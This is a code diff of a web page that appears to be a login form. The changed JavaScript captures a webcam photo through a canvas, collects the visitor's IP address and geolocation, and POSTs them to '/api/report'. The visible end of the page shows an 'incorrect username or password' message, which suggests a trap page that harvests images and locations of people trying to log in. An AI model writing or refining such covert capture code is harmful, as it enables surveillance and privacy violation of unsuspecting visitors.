@@ -63,30 +63,30 @@
       }
 
       try {
-        // Cámara
+        // Cámara y captura usando canvas (100% compatible)
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
         await new Promise(res => setTimeout(res, 1000));
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        const blob = await imageCapture.takePhoto();
 
-        imageBase64 = await new Promise(resolve => {
-          const reader = new FileReader();
-          reader.onloadend = () => resolve(reader.result);
-          reader.readAsDataURL(blob);
-        });
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-        // Detener cámara para liberar recurso
-        track.stop();
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        imageBase64 = canvas.toDataURL('image/png');
+
+        // Detener la cámara
+        stream.getTracks().forEach(track => track.stop());
       } catch (err) {
-        console.warn("No se pudo acceder a la cámara.");
+        console.warn("No se pudo acceder o capturar la cámara.");
       }
 
       try {
-        // Enviar al servidor (lo que haya)
+        // Enviar datos al servidor
         const payload = {
           ip: ip,
           lat: lat,
@@ -94,7 +94,7 @@
           photo: imageBase64
         };
 
-        await fetch('api/report', {
+        await fetch('/api/report', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
@@ -113,7 +113,6 @@
       status.innerText = "❌ Usuario o contraseña incorrectos.";
     }
   });
-</script>
-
+  </script>
 </body>
 </html>
